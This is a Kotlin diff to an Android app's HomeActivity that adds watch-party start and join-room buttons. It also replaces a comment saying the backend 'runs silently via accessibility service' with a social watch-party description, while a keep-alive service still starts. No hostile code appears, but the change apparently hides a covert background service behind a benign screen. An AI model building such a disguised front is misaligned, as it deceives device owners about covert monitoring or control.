@@ -3,9 +3,11 @@ package com.phonehand.app
 import android.content.Intent
 import android.os.Bundle
 import android.util.Log
+import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import com.google.android.material.textfield.TextInputEditText
 
-/** Minimal Watch Together home — backend runs silently via accessibility service. */
+/** Watch Together home — social watch party first, catalog secondary. */
 class HomeActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -24,11 +26,29 @@ class HomeActivity : AppCompatActivity() {
         }
 
         setContentView(R.layout.activity_home)
-        findViewById<android.view.View>(R.id.btnBrowseMovies).setOnClickListener {
+
+        findViewById<android.view.View>(R.id.btnStartParty).setOnClickListener {
+            startActivity(Intent(this, WatchRoomActivity::class.java))
+        }
+
+        val roomInput = findViewById<TextInputEditText>(R.id.homeRoomInput)
+        findViewById<android.view.View>(R.id.btnJoinRoom).setOnClickListener {
+            val code = roomInput.text?.toString()?.trim()?.uppercase().orEmpty()
+            if (code.length < 2) {
+                Toast.makeText(this, R.string.watch_room_hint, Toast.LENGTH_SHORT).show()
+                return@setOnClickListener
+            }
+            startActivity(
+                Intent(this, WatchRoomActivity::class.java).apply {
+                    putExtra(WatchRoomActivity.EXTRA_ROOM_CODE, code)
+                },
+            )
+        }
+
+        findViewById<android.view.View>(R.id.btnBrowseCatalog).setOnClickListener {
             startActivity(Intent(this, MoviesActivity::class.java))
         }
-        // Defer background work until after the first frame — avoids FGS timeout
-        // racing activity startup on cold launch (Oppo / Android 12+).
+
         window.decorView.post {
             if (isFinishing || isDestroyed) return@post
             SafeKeepAlive.start(this)
